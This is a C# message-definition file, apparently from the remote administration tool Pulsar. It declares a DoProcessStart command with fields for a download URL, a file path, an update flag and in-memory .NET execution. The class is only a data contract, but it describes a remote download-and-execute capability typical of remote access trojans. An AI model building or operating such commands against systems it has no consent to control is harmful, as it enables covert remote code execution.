using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoProcessStart : IMessage
    {
        [Key(1)]
        public string DownloadUrl { get; set; }

        [Key(2)]
        public string FilePath { get; set; }

        [Key(3)]
        public bool IsUpdate { get; set; }

        [Key(4)]
        public bool ExecuteInMemoryDotNet { get; set; }
    }
}
